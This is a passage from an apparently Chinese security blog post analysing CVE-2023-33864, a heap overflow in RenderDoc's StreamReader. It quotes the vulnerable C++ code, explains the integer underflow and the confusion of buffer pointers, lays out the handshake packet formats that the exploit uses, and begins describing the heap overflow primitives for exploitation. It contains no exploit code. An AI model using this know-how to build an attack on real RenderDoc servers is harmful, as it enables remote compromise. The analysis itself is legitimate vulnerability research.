<span class="mi">357</span>   <span class="k">if</span><span class="p">(</span><span class="n">dest</span> <span class="o">&amp;&amp;</span> <span class="n">ret</span><span class="p">)</span>
<span class="mi">358</span>     <span class="n">memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">m_BufferHead</span> <span class="o">-</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
</code></pre></div></div>

<p>读取末尾128字节之前的内容进入到string buffer中，更新 m_InputSize 字段，完成了一个字段内容的读取。</p>

<p>在完整接收数据的前提下，为了尽可能地提高程序运行的效率，继续利用 string buffer 未使用的空间来保存下一次解析的内容。</p>

<p>计算 m_BufferBase 缓冲区有待接收的数据长度，利用 string buffer 继续保存。</p>

<p>漏洞点就在这里，因为 m_BufferSize = 64KB，m_InputSize是一个大于等于10MB的值，相减之后发生了整数溢出，bufSize 变成了一个极大的 uint32 类型的值，接下来就会往 string buffer里面写入任意长度的数据。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">366</span> <span class="n">bool</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">ReadFromExternal</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">)</span>
<span class="mi">367</span> <span class="p">{</span>
<span class="p">...</span>
<span class="mi">399</span>       <span class="n">byte</span> <span class="o">*</span><span class="n">readDest</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
<span class="mi">400</span>
<span class="mi">401</span>       <span class="n">success</span> <span class="o">=</span> <span class="n">m_Sock</span><span class="o">-&gt;</span><span class="n">RecvDataBlocking</span><span class="p">(</span><span class="n">readDest</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">length</span><span class="p">);</span>
<span class="mi">402</span>
<span class="mi">403</span>       <span class="k">if</span><span class="p">(</span><span class="n">success</span><span class="p">)</span>
<span class="mi">404</span>       <span class="p">{</span>
<span class="mi">405</span>         <span class="n">m_InputSize</span> <span class="o">+=</span> <span class="n">length</span><span class="p">;</span>
<span class="mi">406</span>         <span class="n">readDest</span> <span class="o">+=</span> <span class="n">length</span><span class="p">;</span>
<span class="mi">407</span>
<span class="mi">408</span>         <span class="kt">uint32_t</span> <span class="n">bufSize</span> <span class="o">=</span> <span class="kt">uint32_t</span><span class="p">(</span><span class="n">m_BufferSize</span> <span class="o">-</span> <span class="n">m_InputSize</span><span class="p">);</span>
<span class="p">...</span>    <span class="c1">// now read more, as much as possible, to try and batch future reads</span>
<span class="mi">411</span>         <span class="n">success</span> <span class="o">=</span> <span class="n">m_Sock</span><span class="o">-&gt;</span><span class="n">RecvDataNonBlocking</span><span class="p">(</span><span class="n">readDest</span><span class="p">,</span> <span class="n">bufSize</span><span class="p">);</span>
</code></pre></div></div>

<p>那么在 ReadLargeBuffer 函数的354行，读取剩下的128字节进入m_BufferBase缓冲区的时候，同样也可以往 m_BufferBase 里面写入任意长度的数据，造成堆溢出。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">271</span> <span class="n">bool</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">ReadLargeBuffer</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">)</span>
<span class="mi">272</span> <span class="p">{</span>
<span class="p">...</span>
<span class="mi">275</span>   <span class="n">byte</span> <span class="o">*</span><span class="n">dest</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">297</span>     <span class="kt">uint64_t</span> <span class="n">directReadLength</span> <span class="o">=</span> <span class="n">length</span> <span class="o">-</span> <span class="mi">128</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">304</span>       <span class="n">bool</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">ReadFromExternal</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">directReadLength</span><span class="p">);</span>
<span class="mi">305</span>
<span class="mi">306</span>       <span class="n">dest</span> <span class="o">+=</span> <span class="n">directReadLength</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">350</span>   <span class="n">m_BufferHead</span> <span class="o">=</span> <span class="n">m_BufferBase</span> <span class="o">+</span> <span class="n">m_BufferSize</span><span class="p">;</span>
<span class="p">...</span>
<span class="mi">354</span>   <span class="n">bool</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">ReadFromExternal</span><span class="p">(</span><span class="n">m_BufferHead</span> <span class="o">-</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
<span class="p">...</span>
<span class="mi">357</span>   <span class="k">if</span><span class="p">(</span><span class="n">dest</span> <span class="o">&amp;&amp;</span> <span class="n">ret</span><span class="p">)</span>
<span class="mi">358</span>     <span class="n">memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">m_BufferHead</span> <span class="o">-</span> <span class="mi">128</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
</code></pre></div></div>

<h2 id="握手包的结构">握手包的结构</h2>

<p>renderdoc私有调试协议是作为TCP协议的载荷进行传输的。</p>

<p>exp用到了以下2种握手包</p>

<p>格式一：不包含 callstack 信息</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 0                   1                   2                   3
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        0x2  handshake flag                    |  
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        0x0                                    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        0x9  version                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        client name length                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        client name                            |
|                         ......                                |
|                         ......                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        1 or 0 (kick or not)                   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        padding bytes                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

</code></pre></div></div>

<p>格式二：包含 callstack 信息</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 0                   1                   2                   3
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     0x2 ｜ 0x10000     handshake with callstack information   |  
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                callstack size （sizeof(unsigned long)）        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                     callstack information                     |
|                         ......                                |
|                         ......                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        0x1 callstack num                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        0x9  version                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        client name length                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        client name                            |
|                         ......                                |
|                         ......                                |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        padding bytes                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

 0                   1                   2                   3
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          0x80 bytes                           |  
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      1 or 0 (kick or not)                     |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre></div></div>

<h2 id="io-过程分析">I/O 过程分析</h2>

<h3 id="io相关的数据结构与算法">I/O相关的数据结构与算法</h3>

<p>（这一块要讲，不然后面无法理解 exp 载荷部分为什么要那么写）</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_4_%E9%A1%B5.jpg" alt="renderdoc-第 4 页.jpg" /></p>

<p>renderdoc 使用了高效的 TCP 通信方式，体现在如下两点：</p>

<ul>
  <li>维护了一个网络数据缓存，通过超量读取数据的方式缓存网络数据，减少了网络协议栈的开销;</li>
  <li>接收超大数据（≥10MB）的时候不缓存，直接操作用户缓冲区，减少了数据的拷贝；</li>
</ul>

<p>首先我们要知道 server 接收的数据放在哪里。</p>

<p>前面提到 server 实例化了 StreamReader 对象来进行网络通信，StreamReader 对象里面的m_BufferBase 成员指向了网络数据缓存，缓存的长度初始化为 64KB。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// streamio.cpp</span>

 <span class="mi">42</span> <span class="k">static</span> <span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">initialBufferSize</span> <span class="o">=</span> <span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>
 <span class="p">..</span>
 <span class="mi">92</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">StreamReader</span><span class="p">(</span><span class="n">Network</span><span class="o">::</span><span class="n">Socket</span> <span class="o">*</span><span class="n">sock</span><span class="p">,</span> <span class="n">Ownership</span> <span class="n">own</span><span class="p">)</span>
 <span class="mi">93</span> <span class="p">{</span>
 <span class="mi">94</span>   <span class="n">m_Sock</span> <span class="o">=</span> <span class="n">sock</span><span class="p">;</span>
 <span class="mi">95</span>
 <span class="mi">96</span>   <span class="n">m_BufferSize</span> <span class="o">=</span> <span class="n">initialBufferSize</span><span class="p">;</span>
 <span class="mi">97</span>   <span class="n">m_BufferBase</span> <span class="o">=</span> <span class="n">AllocAlignedBuffer</span><span class="p">(</span><span class="n">m_BufferSize</span><span class="p">);</span>
 <span class="mi">98</span>   <span class="n">m_BufferHead</span> <span class="o">=</span> <span class="n">m_BufferBase</span><span class="p">;</span>
 <span class="mi">99</span>
<span class="mi">100</span>   <span class="c1">// for sockets we use m_InputSize to indicate how much data has been read into the buffer.</span>
<span class="mi">101</span>   <span class="n">m_InputSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</code></pre></div></div>

<p>StreamReader 类里面网络 IO 相关的成员如下，其中公共成员 Read 函数用于从套接字接收数据，接收数据的长度 numBytes 由<strong>调用者</strong>保障，确保不发生缓冲区溢出，data 指向使用者的缓冲区。</p>

<p>StreamReader ::m_BufferBase 指针指网络数据缓存。</p>

<p>StreamReader::Read 函数从套接字接收数据先缓存到 m_BufferBase 里面，再根据使用者的需求拷贝 numBytes 个字节到参数 data 指向的用户缓冲区。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">StreamReader</span>
<span class="p">{</span>
<span class="nl">public:</span>
	<span class="c1">// 从套接字读取数据</span>
	<span class="kt">bool</span> <span class="n">Read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">numBytes</span><span class="p">){</span> <span class="p">......</span> <span class="p">}</span>
	
<span class="k">private</span><span class="o">:</span>
  <span class="c1">// base of the buffer allocation, 指向网络缓冲区，长度64KB</span>
  <span class="n">byte</span> <span class="o">*</span><span class="n">m_BufferBase</span><span class="p">;</span>

  <span class="c1">// where we are currently reading from in the buffer, 网络缓冲区读指针</span>
  <span class="n">byte</span> <span class="o">*</span><span class="n">m_BufferHead</span><span class="p">;</span>

  <span class="c1">// the size of the buffer (just a window if reading from external source)</span>
  <span class="kt">uint64_t</span> <span class="n">m_BufferSize</span><span class="p">;</span>

  <span class="c1">// the total size of the total input. This is how many bytes you can read, regardless</span>
  <span class="c1">// of how many bytes might actually be stored on the other side of the source (i.e.</span>
  <span class="c1">// this is the uncompressed output size)</span>
  <span class="kt">uint64_t</span> <span class="n">m_InputSize</span><span class="p">;</span>  <span class="c1">// 从套接字已经读取的字节数</span>

  <span class="c1">// socket, if we're reading from a socket</span>
  <span class="n">Network</span><span class="o">::</span><span class="n">Socket</span> <span class="o">*</span><span class="n">m_Sock</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>   <span class="c1">// 套接字封装</span>

  <span class="c1">// the offset in the file/decompressor that corresponds to the start of m_BufferBase</span>
  <span class="kt">uint64_t</span> <span class="n">m_ReadOffset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="p">};</span>
</code></pre></div></div>

<p>StreamReader::Read 函数穿透到底层调用的是 ReadFromExternal 函数，buffer 参数通常是指向网络数据缓存 m_BufferBase，length 是期望接收到的数据长度，由调用者检查数据长度，避免缓冲区溢出。</p>

<p>ReadFromExternal 函数操作套接字接收网络数据，在调用过程中会发生 2 次数据接收：</p>

<p>第一轮接收数据在接收完 length 个字节的数据之前，线程会一直<strong>阻塞</strong>，确保length长度的数据完整接收，因为这 length 个字节数据是用户请求、并且当前还未接收的数据，是属于当前紧急处理的事项。</p>

<p>第二轮接收数据是<strong>非阻塞</strong>式的，在第一轮接收成功之后，在确保 m_BufferBase 缓冲区不溢出的情况下，尽可能多的接收数据，作用是为后续的用户请求缓存数据，避免重复传输，减小网络开销。</p>

<p>在 renderdoc 的客户端实现中，当一个数据包内容确定下来后，在 server 请求的数据之外也会尽可能多地传输下一阶段需要用到的数据。server 通过上述机制缓存多余的数据，等解析到那些字段的时候就不用再向 client 请求。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">366</span> <span class="n">bool</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">ReadFromExternal</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">)</span>
<span class="mi">367</span> <span class="p">{</span>
<span class="p">...</span>
<span class="mi">399</span>       <span class="n">byte</span> <span class="o">*</span><span class="n">readDest</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
<span class="mi">400</span>       <span class="c1">// 阻塞式recv，确保全部读取了length个字节的数据</span>
<span class="mi">401</span>       <span class="n">success</span> <span class="o">=</span> <span class="n">m_Sock</span><span class="o">-&gt;</span><span class="n">RecvDataBlocking</span><span class="p">(</span><span class="n">readDest</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">length</span><span class="p">);</span>
<span class="mi">402</span>
<span class="mi">403</span>       <span class="k">if</span><span class="p">(</span><span class="n">success</span><span class="p">)</span>
<span class="mi">404</span>       <span class="p">{</span>
<span class="mi">405</span>         <span class="n">m_InputSize</span> <span class="o">+=</span> <span class="n">length</span><span class="p">;</span>
<span class="mi">406</span>         <span class="n">readDest</span> <span class="o">+=</span> <span class="n">length</span><span class="p">;</span>
<span class="mi">407</span>
<span class="mi">408</span>         <span class="kt">uint32_t</span> <span class="n">bufSize</span> <span class="o">=</span> <span class="kt">uint32_t</span><span class="p">(</span><span class="n">m_BufferSize</span> <span class="o">-</span> <span class="n">m_InputSize</span><span class="p">);</span>
<span class="p">...</span>    <span class="c1">// now read more, as much as possible, to try and batch future reads</span>
<span class="mi">411</span>         <span class="n">success</span> <span class="o">=</span> <span class="n">m_Sock</span><span class="o">-&gt;</span><span class="n">RecvDataNonBlocking</span><span class="p">(</span><span class="n">readDest</span><span class="p">,</span> <span class="n">bufSize</span><span class="p">);</span>
</code></pre></div></div>

<p>以上复杂的 I/O 流程需要一套读写指示器来管理缓冲区的内容，所以就需要用到 StreamReader 类的  3 个成员变量：m_BufferBase、m_BufferHead、m_InputSize</p>

<p>m_BufferBase 是网络数据缓存，初始长度为64KB；</p>

<p>m_BufferHead 是读指针，指向 m_BufferBase 中下一次读取的位置，其他地方要用数据就得从网络数据缓存里面读取，从哪里开始读取就通过 m_BufferHead 指示；</p>

<p>m_InputSize 记录当前从套接字读取的数据总量。</p>

<p>这三个成员的关系如下：</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_2_%E9%A1%B5.jpg" alt="renderdoc-第 2 页.jpg" /></p>

<p>数据保存到 m_BufferBase 的时候累加 m_InputSize 。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">366</span> <span class="n">bool</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">ReadFromExternal</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">)</span>
<span class="mi">367</span> <span class="p">{</span>
<span class="p">...</span>
<span class="mi">399</span>       <span class="n">byte</span> <span class="o">*</span><span class="n">readDest</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)</span><span class="n">buffer</span><span class="p">;</span>
<span class="mi">400</span>       <span class="c1">// 阻塞式recv，确保全部读取了length个字节的数据</span>
<span class="mi">401</span>       <span class="n">success</span> <span class="o">=</span> <span class="n">m_Sock</span><span class="o">-&gt;</span><span class="n">RecvDataBlocking</span><span class="p">(</span><span class="n">readDest</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">length</span><span class="p">);</span>
<span class="mi">402</span>
<span class="mi">403</span>       <span class="k">if</span><span class="p">(</span><span class="n">success</span><span class="p">)</span>
<span class="mi">404</span>       <span class="p">{</span>
<span class="mi">405</span>         <span class="n">m_InputSize</span> <span class="o">+=</span> <span class="n">length</span><span class="p">;</span>
<span class="mi">406</span>         <span class="n">readDest</span> <span class="o">+=</span> <span class="n">length</span><span class="p">;</span>
<span class="mi">407</span>
<span class="mi">408</span>         <span class="kt">uint32_t</span> <span class="n">bufSize</span> <span class="o">=</span> <span class="kt">uint32_t</span><span class="p">(</span><span class="n">m_BufferSize</span> <span class="o">-</span> <span class="n">m_InputSize</span><span class="p">);</span>
<span class="p">...</span>    <span class="c1">// now read more, as much as possible, to try and batch future reads</span>
<span class="mi">411</span>         <span class="n">success</span> <span class="o">=</span> <span class="n">m_Sock</span><span class="o">-&gt;</span><span class="n">RecvDataNonBlocking</span><span class="p">(</span><span class="n">readDest</span><span class="p">,</span> <span class="n">bufSize</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_3_%E9%A1%B5.jpg" alt="renderdoc-第 3 页.jpg" /></p>

<p>从 m_BufferBase 向用户缓冲区拷贝数据时，从 m_BufferHead 指向的位置开始读取，拷贝完成后更新 m_BufferHead 的位置。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kt">bool</span> <span class="nf">Read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">numBytes</span><span class="p">)</span>
 <span class="p">{</span>
		<span class="p">......</span>
    <span class="c1">// perform the actual copy</span>
    <span class="k">if</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
      <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">m_BufferHead</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">numBytes</span><span class="p">);</span>

    <span class="c1">// advance head</span>
    <span class="n">m_BufferHead</span> <span class="o">+=</span> <span class="n">numBytes</span><span class="p">;</span>

    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
 <span class="p">}</span>
</code></pre></div></div>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_3_%E9%A1%B5%201.jpg" alt="renderdoc-第 3 页.jpg" /></p>

<p>若用户请求数据超过 10MB，网络数据直接写入StreamReader::Read第一个参数指定的用户缓冲区，而不经过 m_BufferBase 缓存。</p>

<p>ReadLargeBuffer 函数的作用是写入数据到用户缓冲区。</p>

<p>小于 10MB 的数据请求，数据先进入 m_BufferBase 缓存，再 memcpy 到用户缓冲区。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">bool</span> <span class="nf">Read</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">numBytes</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">......</span>

    <span class="k">if</span><span class="p">(</span><span class="n">m_File</span> <span class="o">||</span> <span class="n">m_Sock</span> <span class="o">||</span> <span class="n">m_Decompressor</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="c1">// 若用户请求的数据大于未读数据长度, 发起套接字读取</span>
      <span class="k">if</span><span class="p">(</span><span class="n">numBytes</span> <span class="o">&gt;</span> <span class="n">Available</span><span class="p">())</span>
      <span class="p">{</span>
        <span class="kt">bool</span> <span class="n">success</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
        <span class="kt">bool</span> <span class="n">alreadyread</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
			<span class="c1">// 若用户请求数据超过 10MB, 网络数据直接写入用户缓冲区, 而不经过 m_BufferBase</span>
        <span class="k">if</span><span class="p">(</span><span class="n">numBytes</span> <span class="o">&gt;=</span> <span class="mi">10</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">&amp;&amp;</span> <span class="n">Available</span><span class="p">()</span> <span class="o">+</span> <span class="mi">128</span> <span class="o">&lt;</span> <span class="n">numBytes</span><span class="p">)</span>
        <span class="p">{</span>
      <span class="c1">// 网络数据直接写入用户缓冲区</span>
          <span class="n">success</span> <span class="o">=</span> <span class="n">ReadLargeBuffer</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">numBytes</span><span class="p">);</span>
          <span class="n">alreadyread</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
      <span class="c1">// 若用户请求不超过 10MB, 网络数据先缓存到 m_BufferBase, 后面再拷贝到用户缓冲区</span>
          <span class="n">success</span> <span class="o">=</span> <span class="n">Reserve</span><span class="p">(</span><span class="n">numBytes</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">success</span><span class="p">)</span>
        <span class="p">{</span>
          <span class="k">if</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
            <span class="n">memset</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">numBytes</span><span class="p">);</span>
          <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
        <span class="p">}</span>
			<span class="c1">// 若用户请求数据超过 10MB, 函数在这里返回</span>
        <span class="k">if</span><span class="p">(</span><span class="n">alreadyread</span><span class="p">)</span>
          <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
		<span class="c1">// 若用户请求不超过 10MB, 在这里发生拷贝</span>
    <span class="c1">// perform the actual copy</span>
    <span class="k">if</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
      <span class="n">memcpy</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">m_BufferHead</span><span class="p">,</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">numBytes</span><span class="p">);</span>

    <span class="c1">// advance head</span>
    <span class="n">m_BufferHead</span> <span class="o">+=</span> <span class="n">numBytes</span><span class="p">;</span>

    <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
 <span class="p">}</span>

</code></pre></div></div>

<h3 id="超长-client-name-的处理">超长 client name 的处理</h3>

<p>握手包的 client name 保存在一个专门的堆缓冲区，我们暂且称之为 string buffer。string buffer 的长度由握手包的 client name length 字段指定。</p>

<p>若 client name 长度小于10MB，那么根据是否大于64KB来决定是否对 m_BufferBase 进行 resize。先从套接字读取 client name 到 m_BufferBase 缓冲区，再拷贝到 string buffer 里面。</p>

<p>若client name长度大于等于10MB， 那么直接从套接字读取数据到 string buffer。</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc.jpg" alt="renderdoc.jpg" /></p>

<h2 id="漏洞产生的深层次原因">漏洞产生的深层次原因</h2>

<p><strong>这个漏洞产生的原因不是通常我们认为的“开发者忽略了什么”，而是设计模式的问题。</strong></p>

<p><strong>所以乍一看关于漏洞描述的每个字、每条逻辑都理解明白了，但总觉得哪里还是不对劲，却又说不出哪里不对劲来。</strong></p>

<p><strong>仔细分析一下就是对象接口的混用。</strong></p>

<p>我认为 ReadFromExternal 函数只能对 m_BufferBase 缓存进行写操作，因为ReadFromExternal 函数必须配合 StreamReader 对象的指示器来使用，这些都是围绕网络数据缓存设计的。</p>

<p>接收超长内容（≥10MB）调用的 ReadLargeBuffer 函数是直接对用户指定的缓冲区进行写数据。但是这个函数穿透到底层也是调用 ReadFromExternal 进行套接字的读写，导致了 StreamReader 对象的指示器发生了混乱。</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_4_%E9%A1%B5.jpg" alt="renderdoc-第 4 页.jpg" /></p>

<p>所以虽然表面上漏洞函数是 ReadFromExternal，该函数本身设计的并没有问题。</p>

<p>真正的问题是 StreamReade::ReadLargeBuffer 方法不应该调用 ReadFromExternal，而应该单独设计从套接字读取数据的逻辑来处理超长内容的接收。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">StreamReader</span>
<span class="p">{</span>
<span class="nl">public:</span>
	<span class="p">......</span>
	
<span class="nl">private:</span>
  <span class="p">......</span>
  <span class="kt">bool</span> <span class="n">Reserve</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">numBytes</span><span class="p">);</span>
  <span class="kt">bool</span> <span class="n">ReadLargeBuffer</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">);</span>
  <span class="kt">bool</span> <span class="n">ReadFromExternal</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">);</span>
  <span class="p">......</span>

<span class="p">};</span>
</code></pre></div></div>

<h1 id="漏洞利用">漏洞利用</h1>

<h2 id="堆的控制能力">堆的控制能力</h2>

<h3 id="堆溢出能力">堆溢出能力</h3>

<p>在接收超长内容的时候，可以在两个地方溢出，一是在大于 10MB 的 string buffer，二是在 64KB 的 m_BufferBase。</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">bool</span> <span class="n">StreamReader</span><span class="o">::</span><span class="n">ReadLargeBuffer</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">length</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">......</span>
  <span class="k">if</span><span class="p">(</span><span class="n">length</span> <span class="o">&gt;</span> <span class="mi">128</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="kt">uint64_t</span> <span class="n">directReadLength</span> <span class="o">=</span> <span class="n">length</span> <span class="o">-</span> <span class="mi">128</span><span class="p">;</span>

    <span class="n">length</span> <span class="o">-=</span> <span class="n">directReadLength</span><span class="p">;</span>
    <span class="n">m_ReadOffset</span> <span class="o">+=</span> <span class="n">directReadLength</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="kt">bool</span> <span class="n">ret</span> <span class="o">=</span> <span class="o">**</span><span class="n">ReadFromExternal</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">directReadLength</span><span class="p">);</span> <span class="c1">// 第一处，对string buffer溢出**</span>

      <span class="n">dest</span> <span class="o">+=</span> <span class="n">directReadLength</span><span class="p">;</span>

      <span class="c1">// if we failed, return now</span>
      <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">ret</span><span class="p">)</span>
